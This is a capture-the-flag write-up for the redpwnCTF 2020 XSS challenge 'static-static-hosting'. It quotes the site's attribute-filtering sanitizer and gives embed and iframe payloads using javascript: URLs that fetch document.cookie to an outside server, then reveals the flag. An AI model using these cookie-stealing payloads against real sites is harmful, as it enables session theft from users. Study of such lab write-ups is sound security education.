---
title: static-static-hosting
date: 2020-06-23
tags: web, xss
ctf: redpwnCTF 2020
---
## Problem
```
Seeing that my last website was a success, I made a version where instead of storing text, you can make your own custom websites! If you make something cool, send it to me here

Site: static-static-hosting.2020.redpwnc.tf

Note: The site is entirely static. Dirbuster will not be useful in solving it.
```

## Solution
Similarly to [static-pastebin](./static-pastebin.md), this challenge takes user input, and creates a webpage using said input. The input is encoded into base64 to create a site, and then decodes it from the url to render it. For example, a site with the text ```<p>hi</p>``` generates the URL ```https://static-static-hosting.2020.redpwnc.tf/site/#PHA+dGVzdDwvcD4=```, as ```PHA+dGVzdDwvcD4=``` is the base64 encoding of ```test```.

The challenge also provides a link to submit a paste to the admin of the site, who would visit the link. Thus, this is XSS (cross site scripting) challenge.

Looking at the code to decode a paste, we see that there is some sanization on the input to try to stop XSS attacks:

```js
function display(input) {
    document.documentElement.innerHTML = clean(input);
}

function clean(input) {
    const template = document.createElement('template');
    const html = document.createElement('html');
    template.content.appendChild(html);
    html.innerHTML = input;

    sanitize(html);

    const result = html.innerHTML;
    return result;
}

function sanitize(element) {
    const attributes = element.getAttributeNames();
    for (let i = 0; i < attributes.length; i++) {
        // Let people add images and styles
        if (!['src', 'width', 'height', 'alt', 'class'].includes(attributes[i])) {
            element.removeAttribute(attributes[i]);
        }
    }

    const children = element.children;
    for (let i = 0; i < children.length; i++) {
        if (children[i].nodeName === 'SCRIPT') {
            element.removeChild(children[i]);
            i --;
        } else {
            sanitize(children[i]);
        }
    }
}
```

The code removes all ```<script>``` tags, and limits the attributes to src, width, height, alt and class. That means that the img XSS we used in static-pastebin couldn't be used, as it relied on the onerror attribute. We could try a different tag for injection, such as ```<embed>``` for our payload:

```html
<embed src=javascript:fetch('https://api.sunnyzuo.com/'+document.cookie)>
```

Using the same web server for [static-pastebin](./static-pastebin.md), we can find the cookie of the admin bot and get out flag.

However, this payload didn't work; it functioned when I tested it using Firefox, but I got no response from the bot. After messaging the challenge author and learning that the bot ran on Chrome, I created a modified payload, using ```<iframe>``` instead:

```html
<iframe src=javascript:fetch('https://api.sunnyzuo.com/'+document.cookie)>
```

This payload ran fine, and we can find the flag in the server logs:
```
/flag=flag{wh0_n33d5_d0mpur1fy}
```

**Flag:** ```flag{wh0_n33d5_d0mpur1fy}```